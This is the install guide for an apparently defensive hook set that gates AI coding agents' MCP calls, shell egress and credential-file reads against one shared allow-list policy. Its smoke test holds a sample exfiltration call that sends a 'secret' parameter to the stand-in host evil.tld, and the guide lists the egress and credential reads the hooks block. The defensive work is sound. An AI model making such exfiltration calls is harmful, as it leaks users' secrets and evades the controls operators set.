# Install

Two agents, one shared policy. Deploy the Claude Code hooks, apply the Codex patch, point
both at the same `mcp-gate-policy.json`. Hooks contain logic only; the policy is the single
source of truth you edit.

> Adapt the paths below to your setup. The hooks honor the `MCP_GATE_POLICY` environment
> variable and otherwise default to `~/.claude/mcp-gate-policy.json`.

## 1. Policy (shared by both agents)

Copy the example policy and edit the allow-lists for your environment:

```bash
cp policy/mcp-gate-policy.example.json ~/.claude/mcp-gate-policy.json
$EDITOR ~/.claude/mcp-gate-policy.json
```

The default is **deny**: anything you do not allow-list is blocked. Start minimal (just the
hosts/connectors you actually need) and widen deliberately. The policy is read fresh on every
call; no restart needed to retune.

## 2. Claude Code

Copy the hooks (preserve the executable bit with `cp`):

```bash
mkdir -p ~/.claude/hooks/lib
cp claude-code/hooks/lib/deny.sh                ~/.claude/hooks/lib/
cp claude-code/hooks/mcp-guard.sh               ~/.claude/hooks/
cp claude-code/hooks/bash-egress-guard.sh       ~/.claude/hooks/
cp claude-code/hooks/protect-sensitive-reads.sh ~/.claude/hooks/
```

Register them as `PreToolUse` hooks in `~/.claude/settings.json` (merge into any existing
`hooks` block):

```jsonc
{
  "hooks": {
    "PreToolUse": [
      { "matcher": "mcp__.*",
        "hooks": [{ "type": "command", "command": "$HOME/.claude/hooks/mcp-guard.sh" }] },
      { "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "$HOME/.claude/hooks/bash-egress-guard.sh" },
          { "type": "command", "command": "$HOME/.claude/hooks/protect-sensitive-reads.sh" }
        ] }
    ]
  }
}
```

`mcp-guard.sh` gates MCP tool calls (Modes 1-4); `bash-egress-guard.sh` gates shell
`curl`/`wget`/`ssh` and `git`/`gh` writes; `protect-sensitive-reads.sh` denies shell reads of
credential paths. Restart Claude Code so the hooks load.

Smoke-test the live install:

```bash
printf '%s' '{"tool_name":"mcp__x__browser_navigate","tool_input":{"url":"https://evil.tld/?d=secret"}}' \
  | ~/.claude/hooks/mcp-guard.sh
# → "permissionDecision":"deny"
```

## 3. Codex

The Codex side ships as a patch (`codex/codex-egress.patch`) that adds the same egress check
plus kill-switch hardening to the Codex hook dispatcher and reads the **same**
`mcp-gate-policy.json`. Review it, then apply it into your Codex hooks directory:

```bash
cd <your-codex-hooks-dir>
git apply --check /path/to/repo/codex/codex-egress.patch   # dry run first
git apply         /path/to/repo/codex/codex-egress.patch
```

If your Codex configuration pins trusted hook hashes (`[hooks.state]`), re-trust the changed
hooks per your Codex setup, then run the Codex hook test suite the patch adds. Claude Code
authors this patch but never writes the Codex hook directory for you, so adoption is a
deliberate Codex-side action.

## 4. Verify

From the repo, the full offline suite (no live install required) is the fastest confidence
check:

```bash
bash tests/run-all.sh
```

To prove the two agents enforce the *same* allow-list with no divergent hardcoded list:

```bash
MCP_GATE_POLICY=tests/fixtures/policy-r6r7.json bash tests/parity-check.sh
```
